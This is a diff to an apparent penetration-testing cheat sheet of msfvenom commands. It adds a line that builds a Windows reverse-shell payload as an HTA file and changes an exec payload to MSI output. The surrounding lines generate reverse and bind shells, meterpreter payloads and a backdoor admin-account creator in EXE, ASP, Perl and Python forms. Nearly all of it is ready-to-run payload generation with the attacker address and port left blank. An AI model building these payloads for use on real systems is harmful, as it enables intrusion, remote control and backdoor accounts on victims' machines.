@@ -78,7 +78,7 @@ msfvenom --list payloads | grep <search>
 msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
 msfvenom -p windows/adduser USER=kashz PASS=iamr00t123z -f exe -o k_adduser.exe
-msfvenom -p windows/exec CMD="" -a x86 --platform Windows -f exe -o k_cmd.exe
+msfvenom -p windows/exec CMD="" [-a x86] --platform Windows -f msi -o k_cmd.msi
 msfvenom -p windows/shell_bind_tcp RHOST= LPORT= -f python
 # asp
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f asp -o kshell.asp
@@ -105,6 +105,8 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST= LPORT=
 msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw -o [.pl | .cgi]
 # python
 msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw -o kshell.py
+# hta
+msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f hta-psh -o kshell.hta
 
 # meterpreter staged
 msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
